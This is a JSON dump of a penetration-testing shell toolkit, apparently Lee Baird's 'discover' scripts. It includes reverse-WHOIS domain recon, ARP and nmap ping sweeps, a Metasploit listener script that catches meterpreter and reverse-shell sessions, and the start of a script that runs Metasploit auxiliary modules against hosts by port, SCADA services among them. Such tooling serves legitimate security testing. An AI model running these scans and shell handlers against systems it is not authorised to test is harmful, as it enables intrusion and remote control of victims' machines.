echo\n    echo -n \"Choice: \"\n    read -r CHOICE\n\n    case \"$CHOICE\" in\n        1) \"$DISCOVER\"/domain.sh ;;\n        2) \"$DISCOVER\"/person.sh && exit ;;\n        3) \"$DISCOVER\"/generateTargets.sh && exit ;;\n        4) f_cidr ;;\n        5) f_list ;;\n        6) f_single ;;\n        7) f_enumerate ;;\n        8) \"$DISCOVER\"/directObjectRef.sh && exit ;;\n        9) \"$DISCOVER\"/multiTabs.sh && exit ;;\n        10) \"$DISCOVER\"/nikto.sh && exit ;;\n        11) \"$DISCOVER\"/ssl.sh && exit ;;\n        12) \"$DISCOVER\"/parse.sh && exit ;;\n        13) \"$DISCOVER\"/payload.sh && exit ;;\n        14) \"$DISCOVER\"/listener.sh && exit ;;\n        15) \"$DISCOVER\"/update.sh && exit ;;\n        16) exit ;;\n        99) \"$DISCOVER\"/newModules.sh && exit ;;\n        *) echo; echo -e \"${RED}[!] Invalid choice or entry, try again.${NC}\"; echo; sleep 2; f_main ;;\n    esac\n}\n\nexport -f f_main\n\n# Run the script\nf_main\n"
        },
        {
          "name": "domain.sh",
          "type": "blob",
          "size": 4.3251953125,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\nclear\nf_banner\n\necho -e \"${BLUE}RECON${NC}\"\necho\necho \"1.  Passive\"\necho \"2.  Find registered domains\"\necho \"3.  Previous menu\"\necho\necho -n \"Choice: \"\nread -r CHOICE\n\ncase \"$CHOICE\" in\n    1) \"$DISCOVER\"/passive.sh && exit ;;\n    2)\n        clear\n        f_banner\n\n        echo -e \"${BLUE}Find registered domains.${NC}\"\n        echo\n        echo \"Open a browser to https://www.reversewhois.io/\"\n        echo \"Enter your domain and solve the captcha.\"\n        echo \"Select all > copy all of the text and paste into a new file.\"\n\n        f_location\n        echo\n        grep '^[0-9]' \"$LOCATION\" | awk '{print $2}' | sort -u > tmp\n        TOTAL=$(wc -l tmp | sed -e 's/^[ \\t]*//' | cut -d ' ' -f1)\n\n        while read -r REGDOMAIN; do\n            IPADDR=$(dig +short \"$REGDOMAIN\" | grep -Eiv '(0.0.0.0|127.0.0.1|127.0.0.6)' | sed '/[a-z]/d')\n            whois -H \"$REGDOMAIN\" | grep -Eiv '(#|please query|personal data|redacted|whois|you agree)' | sed '/^$/d' > tmp2\n            wait\n\n            REGEMAIL=$(grep 'Registrant Email:' tmp2 | cut -d ' ' -f3 | tr 'A-Z' 'a-z')\n\n            if [[ \"$REGEMAIL\" == *'abuse'* || \"$REGEMAIL\" == *'anonymize.com'* || \"$REGEMAIL\" == *'buydomains.com'* || \"$REGEMAIL\" == *'cloudflareregistrar.com'* || \"$REGEMAIL\" == *'contact-form'* || \"$REGEMAIL\" == *'contact.gandi.net'* || \"$REGEMAIL\" == *'csl-registrar.com'* || \"$REGEMAIL\" == *'domaindiscreet.com'* || \"$REGEMAIL\" == *'dynadot.com'* || \"$REGEMAIL\" == *'email'* || \"$REGEMAIL\" == *'gname.com'* || \"$REGEMAIL\" == *'google.com'* || \"$REGEMAIL\" == *'identity-protect.org'* || \"$REGEMAIL\" == *'meshdigital.com'* || \"$REGEMAIL\" == *'mydomainprovider.com'* || \"$REGEMAIL\" == *'myprivatename.com'* || \"$REGEMAIL\" == *'networksolutionsprivateregistration'* || \"$REGEMAIL\" == *'please'* || \"$REGEMAIL\" == *'p.o-w-o.info'* || \"$REGEMAIL\" == *'privacy'* || \"$REGEMAIL\" == *'Redacted'* || \"$REGEMAIL\" == *'redacted'* || \"$REGEMAIL\" == *'select'* || \"$REGEMAIL\" == *'tieredaccess.com'* ]]; then\n                REGEMAIL=''\n            fi\n\n            REGORG=$(grep 'Registrant Organization:' tmp2 | cut -d ':' -f2 | cut -d ' ' -f2- | sed 's/     //g; s/administration/Administration/g; s/Anonymize, Inc/Anonymize Inc/g; s/By /by /g; s/, Corp/ Corp/g; s/Data Protected//g; s/family/Family/g; s/Identity Protect Limited//g; s/Identity Protection Service//g; s/, Inc. / Inc/g; s/, Inc/ Inc/g; s/, Inc /Inc/g; s/Inc./Inc/g; s/INFORMATION SYSTEMS AND MANAGEMENT CONSLANTS/Information Systems and Management Consultants/g; s/INSTITUTE/Institute/g; s/, LLC/ LLC/g; s/MEMORIAL/Memorial/g; s/, N.A./ N.A./g; s/N\\/A//g; s/Not Disclosed//g; s/None//g; s/NULL//g; s/ (NYHQ)//g; s/Redacted for privacy//g; s/S.L./SL/g; s/Statutory Masking Enabled//g; s/UNIVERSITY/University/g; s/(US) //g; s/WEST VIRGINIA/West Virginia/g')\n\n            if [[ \"$REGORG\" == *'Privacy'* || \"$REGORG\" == *'PRIVACY'* ]]; then\n                    REGORG=''\n            fi\n\n            REGISTRAR=$(grep 'Registrar:' tmp2 | cut -d ' ' -f2- | sed 's/Co.,/Co./g; s/Corp.,/Corp/g; s/Hongkong/Hong Kong/g; s/Identity Protection Service//g; s/Gransy,/Gransy/g; s/, Inc/ Inc/g; s/Inc./Inc/g; s/IncUSA/Inc/g; s/KEY-SYSTEMS/Key-Systems/g; s/Limited,/Ltd /g; s/, LLC/ LLC/g; s/Ltd./Ltd/g; s/, Ltd/ Ltd/g; s/MARKMONITOR/MarkMonitor/g; s/MarkMonitor./MarkMonitor /g; s/Registrar://g; s/REGISTRAR OF DOMAIN NAMES//g; s/s.l./SL/g; s/, S.L./SL/g; s/technologies/Technologies/g; s/technology/Technology/g; s/^[ \\t]*//' | head -n1)\n\n            if [[ \"$REGISTRAR\" == 'Domains' ]]; then\n                REGISTRAR=''\n            fi\n\n            echo \"$REGDOMAIN,$IPADDR,$REGEMAIL,$REGORG,$REGISTRAR\" | grep -v ',,,,' >> tmp3\n            let NUMBER=NUMBER+1\n            echo -ne \"$NUMBER of $TOTAL domains\"\\\\r\n            sleep 2\n        done < tmp\n\n        echo \"Domain,IP Address,Registration Email,Registration Org,Registrar\" > tmp4\n        cat tmp4 tmp3 | grep -Ev '^\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b' | column -t -s ',' | sed 's/[ \\t]*$//' > \"$HOME\"/data/registered-domains\n        rm tmp*\n\n        echo\n        echo \"$MEDIUM\"\n        echo\n        echo \"[*] Scan complete.\"\n        echo\n        echo -e \"The report is located at ${YELLOW}$HOME/data/registered-domains${NC}\"\n        echo\n        exit\n        ;;\n    3) f_main ;;\n    *) echo; echo -e \"${RED}[!] Invalid choice or entry, try again.${NC}\"; echo; sleep 2; \"$DISCOVER\"/domain.sh ;;\nesac\n"
        },
        {
          "name": "generateTargets.sh",
          "type": "blob",
          "size": 2.6611328125,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\n# Check for root\nif [ $EUID -ne 0 ]; then\n    echo\n    echo \"[!] This script must be ran as root.\"\n    echo\n    exit 1\nfi\n\nf_targets(){\n    clear\n    f_banner\n\n    echo -e \"${BLUE}SCANNING${NC}\"\n    echo\n    echo \"1.  ARP scan\"\n    echo \"2.  Ping sweep\"\n    echo \"3.  Previous menu\"\n    echo\n    echo -n \"Choice: \"\n    read -r CHOICE\n\n    case \"$CHOICE\" in\n        1) f_arpscan ;;\n        2) f_pingsweep ;;\n        3) f_main ;;\n        *) echo; echo -e \"${RED}[!] Invalid choice or entry, try again.${NC}\"; echo; sleep 2; \"$DISCOVER\"/generateTargets.sh ;;\n    esac\n}\n\n###############################################################################################################################\n\nf_arpscan(){\n    echo\n    echo \"[*] Scanning\"\n\n    arp-scan --localnet | grep -Eiv '(interface|arp-scan|packets)' > tmp\n    sed '/^$/d' tmp | grep -v \"$MYIP\" | sort -t ' ' -k 1,1 -V > \"$HOME\"/data/arp-scan.txt\n    awk '{print $1}' tmp | grep -v \"$MYIP\" | $SIP | sed '/^$/d' > \"$HOME\"/data/arp-scan-targets.txt\n    rm tmp\n\n    echo\n    echo \"$MEDIUM\"\n    echo\n    echo \"[*] Scan complete.\"\n    echo\n    echo -e \"The new report is located at ${YELLOW}$HOME/data/arp-scan.txt${NC}\"\n    echo\n    exit\n}\n\n###############################################################################################################################\n\nf_pingsweep(){\n    echo\n    echo -e \"${BLUE}Type of input:${NC}\"\n    echo\n    echo \"1.  List containing IPs, ranges, and/or CIDRs.\"\n    echo \"2.  Manual\"\n    echo\n    echo -n \"Choice: \"\n    read -r CHOICE\n\n    case \"$CHOICE\" in\n        1)\n            f_location\n\n            echo\n            echo \"[*] Scanning\"\n            nmap -sn -PS -PE --stats-every 10s -iL \"$LOCATION\" > tmp\n            ;;\n        2)\n            echo\n            echo -n \"Enter a CIDR or range: \"\n            read -r MANUAL\n\n            # Check for no answer\n            if [ -z \"$MANUAL\" ]; then\n                f_error\n            fi\n\n            echo\n            echo \"[*] Scanning\"\n            nmap -sn -PS -PE --stats-every 10s \"$MANUAL\" > tmp\n            ;;\n        *)\n            echo; echo -e \"${RED}[!] Invalid choice or entry, try again.${NC}\"; echo; sleep 2; \"$DISCOVER\"/generateTargets.sh ;;\n    esac\n\n    grep -oE '\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b' tmp | grep -v \"$MYIP\" | $SIP > \"$HOME\"/data/pingsweep.txt\n    rm tmp\n\n    echo\n    echo \"$MEDIUM\"\n    echo\n    echo \"[*] Scan complete.\"\n    echo\n    echo -e \"The new report is located at ${YELLOW}$HOME/data/pingsweep.txt${NC}\"\n    echo\n    exit\n}\n\n###############################################################################################################################\n\nwhile true; do f_targets; done\n"
        },
        {
          "name": "listener.sh",
          "type": "blob",
          "size": 2.3154296875,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\nclear\nf_banner\n\necho -e \"${BLUE}Metasploit Listeners${NC}\"\necho\necho \"1.   android/meterpreter/reverse_tcp\"\necho \"2.   cmd/windows/reverse_powershell\"\necho \"3.   java/jsp_shell_reverse_tcp\"\necho \"4.   linux/x64/meterpreter_reverse_https\"\necho \"5.   linux/x64/meterpreter_reverse_tcp\"\necho \"6.   linux/x64/shell/reverse_tcp\"\necho \"7.   osx/x64/meterpreter_reverse_https\"\necho \"8.   osx/x64/meterpreter_reverse_tcp\"\necho \"9.   php/meterpreter/reverse_tcp\"\necho \"10.  python/meterpreter_reverse_https\"\necho \"11.  python/meterpreter_reverse_tcp\"\necho \"12.  windows/x64/meterpreter_reverse_https\"\necho \"13.  windows/x64/meterpreter_reverse_tcp\"\necho \"14.  Previous menu\"\necho\necho -n \"Choice: \"\nread -r CHOICE\n\ncase \"$CHOICE\" in\n    1) PAYLOAD=\"android/meterpreter/reverse_tcp\" ;;\n    2) PAYLOAD=\"cmd/windows/reverse_powershell\" ;;\n    3) PAYLOAD=\"java/jsp_shell_reverse_tcp\" ;;\n    4) PAYLOAD=\"linux/x64/meterpreter_reverse_https\" ;;\n    5) PAYLOAD=\"linux/x64/meterpreter_reverse_tcp\" ;;\n    6) PAYLOAD=\"linux/x64/shell/reverse_tcp\" ;;\n    7) PAYLOAD=\"osx/x64/meterpreter_reverse_https\" ;;\n    8) PAYLOAD=\"osx/x64/meterpreter_reverse_tcp\" ;;\n    9) PAYLOAD=\"php/meterpreter/reverse_tcp\" ;;\n    10) PAYLOAD=\"python/meterpreter_reverse_https\" ;;\n    11) PAYLOAD=\"python/meterpreter_reverse_tcp\" ;;\n    12) PAYLOAD=\"windows/x64/meterpreter_reverse_https\" ;;\n    13) PAYLOAD=\"windows/x64/meterpreter_reverse_tcp\" ;;\n    14) f_main ;;\n    *) echo; echo -e \"${RED}[!] Invalid choice or entry, try again.${NC}\"; echo; sleep 2; \"$DISCOVER\"/listener.sh ;;\nesac\n\necho\necho -n \"LHOST: \"\nread -r LHOST\n\n# Check for no answer\nif [ -z \"$LHOST\" ]; then\n    LHOST=\"$MYIP\"\n    echo \"[*] Using $MYIP\"\n    echo\nfi\n\necho -n \"LPORT: \"\nread -r LPORT\n\n# Check for no answer\nif [ -z \"$LPORT\" ]; then\n    LPORT=443\n    echo \"[*] Using 443\"\nfi\n\n# Check for valid port number.\nif [[ \"$LPORT\" -lt 1 || \"$LPORT\" -gt 65535 ]]; then\n    f_error\nfi\n\n# Check for root when binding to a low port\nif [[ \"$LPORT\" -lt 1025 && \"$(id -u)\" != \"0\" ]]; then\n    echo\n    echo \"[!] You must be root to bind to a port below 1025.\"\n    echo\n    exit 1\nfi\n\ncp \"$DISCOVER\"/resource/listener.rc /tmp/\n\nsed -i \"s|aaa|$PAYLOAD|g\" /tmp/listener.rc\nsed -i \"s/bbb/$LHOST/g\" /tmp/listener.rc\nsed -i \"s/ccc/$LPORT/g\" /tmp/listener.rc\n\necho\nmsfconsole -q -r /tmp/listener.rc\n"
        },
        {
          "name": "misc",
          "type": "tree",
          "content": null
        },
        {
          "name": "msf-aux.sh",
          "type": "blob",
          "size": 17.8203125,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\necho\necho \"$MEDIUM\"\necho\necho -e \"${BLUE}Starting Postgres.${NC}\"\nservice postgresql start\n\necho\necho -e \"${BLUE}Starting Metasploit.${NC}\"\necho\necho -e \"${BLUE}Using the following resource files.${NC}\"\ncp -R \"$DISCOVER\"/resource/ /tmp/\n\necho workspace -a \"$NAME\" > /tmp/master\necho spool tmpmsf > /tmp/master\n\nif [ -f \"$NAME\"/19.txt ]; then\n    echo \"    Chargen Probe Utility\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/19.txt|g\" /tmp/resource/19-chargen.rc\n    cat /tmp/resource/19-chargen.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/21.txt ]; then\n    echo \"    FTP\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/21.txt|g\" /tmp/resource/21-ftp.rc\n    cat /tmp/resource/21-ftp.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/22.txt ]; then\n    echo \"    SSH\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/22.txt|g\" /tmp/resource/22-ssh.rc\n    cat /tmp/resource/22-ssh.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/23.txt ]; then\n    echo \"    Telnet\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/23.txt|g\" /tmp/resource/23-telnet.rc\n    cat /tmp/resource/23-telnet.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/25.txt ]; then\n    echo \"    SMTP\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/25.txt|g\" /tmp/resource/25-smtp.rc\n    cat /tmp/resource/25-smtp.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/69.txt ]; then\n    echo \"    TFTP\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/69.txt|g\" /tmp/resource/69-tftp.rc\n    cat /tmp/resource/69-tftp.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/79.txt ]; then\n    echo \"    Finger\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/79.txt|g\" /tmp/resource/79-finger.rc\n    cat /tmp/resource/79-finger.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/110.txt ]; then\n    echo \"    POP3\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/110.txt|g\" /tmp/resource/110-pop3.rc\n    cat /tmp/resource/110-pop3.rc >> /tmp/master\nfi\n\n#if [ -f \"$NAME\"/111.txt ]; then\n#    echo \"    RPC\"\n#    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/111.txt|g\" /tmp/resource/111-rpc.rc\n#    cat /tmp/resource/111-rpc.rc >> /tmp/master\n#fi\n\nif [ -f \"$NAME\"/123.txt ]; then\n    echo \"    NTP\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/123.txt|g\" /tmp/resource/123-udp-ntp.rc\n    cat /tmp/resource/123-udp-ntp.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/135.txt ]; then\n    echo \"    DCE/RPC\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/135.txt|g\" /tmp/resource/135-dcerpc.rc\n    cat /tmp/resource/135-dcerpc.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/137.txt ]; then\n    echo \"    NetBIOS\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/137.txt|g\" /tmp/resource/137-udp-netbios.rc\n    cat /tmp/resource/137-udp-netbios.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/143.txt ]; then\n    echo \"    IMAP\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/143.txt|g\" /tmp/resource/143-imap.rc\n    cat /tmp/resource/143-imap.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/161.txt ]; then\n    echo \"    SNMP\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/161.txt|g\" /tmp/resource/161-udp-snmp.rc\n    cat /tmp/resource/161-udp-snmp.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/407.txt ]; then\n    echo \"    Motorola\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/407.txt|g\" /tmp/resource/407-udp-motorola.rc\n    cat /tmp/resource/407-udp-motorola.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/443.txt ]; then\n    echo \"    VMware\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/443.txt|g\" /tmp/resource/443-vmware.rc\n    cat /tmp/resource/443-vmware.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/445.txt ]; then\n    echo \"    SMB\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/445.txt|g\" /tmp/resource/445-smb.rc\n    cat /tmp/resource/445-smb.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/465.txt ]; then\n    echo \"    SMTP/S\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/465.txt|g\" /tmp/resource/465-smtp.rc\n    cat /tmp/resource/465-smtp.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/502.txt ]; then\n    echo \"    SCADA Modbus Client Utility\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/502.txt|g\" /tmp/resource/502-scada.rc\n    cat /tmp/resource/502-scada.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/512.txt ]; then\n    echo \"    Rexec\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/512.txt|g\" /tmp/resource/512-rexec.rc\n    cat /tmp/resource/512-rexec.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/513.txt ]; then\n    echo \"    rlogin\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/513.txt|g\" /tmp/resource/513-rlogin.rc\n    cat /tmp/resource/513-rlogin.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/514.txt ]; then\n    echo \"    rshell\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/514.txt|g\" /tmp/resource/514-rshell.rc\n    cat /tmp/resource/514-rshell.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/523.txt ]; then\n    echo \"    db2\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/523.txt|g\" /tmp/resource/523-udp-db2.rc\n    cat /tmp/resource/523-udp-db2.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/548.txt ]; then\n    echo \"    AFP\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/548.txt|g\" /tmp/resource/548-afp.rc\n    cat /tmp/resource/548-afp.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/623.txt ]; then\n    echo \"    IPMI\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/623.txt|g\" /tmp/resource/623-udp-ipmi.rc\n    cat /tmp/resource/623-udp-ipmi.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/771.txt ]; then\n    echo \"    SCADA Digi\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/771.txt|g\" /tmp/resource/771-scada.rc\n    cat /tmp/resource/771-scada.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/831.txt ]; then\n    echo \"    EasyCafe Server Remote File Access\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/831.txt|g\" /tmp/resource/831-easycafe.rc\n    cat /tmp/resource/831-easycafe.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/902.txt ]; then\n    echo \"    VMware\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/902.txt|g\" /tmp/resource/902-vmware.rc\n    cat /tmp/resource/902-vmware.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/998.txt ]; then\n    echo \"    Novell ZENworks Configuration Management Preboot Service Remote File Access\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/998.txt|g\" /tmp/resource/998-zenworks.rc\n    cat /tmp/resource/998-zenworks.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/1099.txt ]; then\n    echo \"    RMI Registery\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/1099.txt|g\" /tmp/resource/1099-rmi.rc\n    cat /tmp/resource/1099-rmi.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/1158.txt ]; then\n    echo \"    Oracle\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/1158.txt|g\" /tmp/resource/1158-oracle.rc\n    cat /tmp/resource/1158-oracle.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/1414.txt ]; then\n    echo \"    IBM MQ\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/1414.txt|g\" /tmp/resource/1414-ibm-mq.rc\n    cat /tmp/resource/1414-ibm-mq.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/1433.txt ]; then\n    echo \"    MS-SQL\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/1433.txt|g\" /tmp/resource/1433-mssql.rc\n    cat /tmp/resource/1433-mssql.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/1521.txt ]; then\n    echo \"    Oracle\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/1521.txt|g\" /tmp/resource/1521-oracle.rc\n    cat /tmp/resource/1521-oracle.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/1604.txt ]; then\n    echo \"    Citrix\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/1604.txt|g\" /tmp/resource/1604-udp-citrix.rc\n    cat /tmp/resource/1604-udp-citrix.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/1720.txt ]; then\n    echo \"    H323\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/1720.txt|g\" /tmp/resource/1720-h323.rc\n    cat /tmp/resource/1720-h323.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/1900.txt ]; then\n    echo \"    UPnP\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/1900.txt|g\" /tmp/resource/1900-udp-upnp.rc\n    cat /tmp/resource/1900-udp-upnp.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/2049.txt ]; then\n    echo \"    NFS\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/2049.txt|g\" /tmp/resource/2049-nfs.rc\n    cat /tmp/resource/2049-nfs.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/2362.txt ]; then\n    echo \"    SCADA Digi\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/2362.txt|g\" /tmp/resource/2362-udp-scada.rc\n    cat /tmp/resource/2362-udp-scada.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/3000.txt ]; then\n    echo \"    EMC\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/3000.txt|g\" /tmp/resource/3000-emc.rc\n    cat /tmp/resource/3000-emc.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/3050.txt ]; then\n    echo \"    Borland InterBase Services Manager Information\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/3050.txt|g\" /tmp/resource/3050-borland.rc\n    cat /tmp/resource/3050-borland.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/3306.txt ]; then\n    echo \"    MySQL\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/3306.txt|g\" /tmp/resource/3306-mysql.rc\n    cat /tmp/resource/3306-mysql.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/3310.txt ]; then\n    echo \"    ClamAV\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/3310.txt|g\" /tmp/resource/3310-clamav.rc\n    cat /tmp/resource/3310-clamav.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/3389.txt ]; then\n    echo \"    RDP\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/3389.txt|g\" /tmp/resource/3389-rdp.rc\n    cat /tmp/resource/3389-rdp.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/3500.txt ]; then\n    echo \"    EMC\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/3500.txt|g\" /tmp/resource/3500-emc.rc\n    cat /tmp/resource/3500-emc.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/4786.txt ]; then\n    echo \"    Cisco Smart Install\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/4786.txt|g\" /tmp/resource/4786-cisco-smart-install.rc\n    cat /tmp/resource/4786-cisco-smart-install.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/4800.txt ]; then\n    echo \"    Moxa\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/4800.txt|g\" /tmp/resource/4800-udp-moxa.rc\n    cat /tmp/resource/4800-udp-moxa.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/5000.txt ]; then\n    echo \"    Satel\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/5000.txt|g\" /tmp/resource/5000-satel.rc\n    cat /tmp/resource/5000-satel.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/5040.txt ]; then\n    echo \"    DCE/RPC\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/5040.txt|g\" /tmp/resource/5040-dcerpc.rc\n    cat /tmp/resource/5040-dcerpc.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/5060.txt ]; then\n    echo \"    SIP UDP\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/5060.txt|g\" /tmp/resource/5060-udp-sip.rc\n    cat /tmp/resource/5060-udp-sip.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/5060-tcp.txt ]; then\n    echo \"    SIP\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/5060-tcp.txt|g\" /tmp/resource/5060-sip.rc\n    cat /tmp/resource/5060-sip.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/5432.txt ]; then\n    echo \"    Postgres\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/5432.txt|g\" /tmp/resource/5432-postgres.rc\n    cat /tmp/resource/5432-postgres.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/5560.txt ]; then\n    echo \"    Oracle iSQL\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/5560.txt|g\" /tmp/resource/5560-oracle.rc\n    cat /tmp/resource/5560-oracle.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/5631.txt ]; then\n    echo \"    pcAnywhere\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/5631.txt|g\" /tmp/resource/5631-pcanywhere.rc\n    cat /tmp/resource/5631-pcanywhere.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/5632.txt ]; then\n    echo \"    pcAnywhere\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/5632.txt|g\" /tmp/resource/5632-pcanywhere.rc\n    cat /tmp/resource/5632-pcanywhere.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/5900.txt ]; then\n    echo \"    VNC\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/5900.txt|g\" /tmp/resource/5900-vnc.rc\n    cat /tmp/resource/5900-vnc.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/5920.txt ]; then\n    echo \"    CCTV DVR\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/5920.txt|g\" /tmp/resource/5920-cctv.rc\n    cat /tmp/resource/5920-cctv.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/5984.txt ]; then\n    echo \"    CouchDB\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/5984.txt|g\" /tmp/resource/5984-couchdb.rc\n    cat /tmp/resource/5984-couchdb.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/5985.txt ]; then\n    echo \"    winrm\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/5985.txt|g\" /tmp/resource/5985-winrm.rc\n    cat /tmp/resource/5985-winrm.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/x11.txt ]; then\n    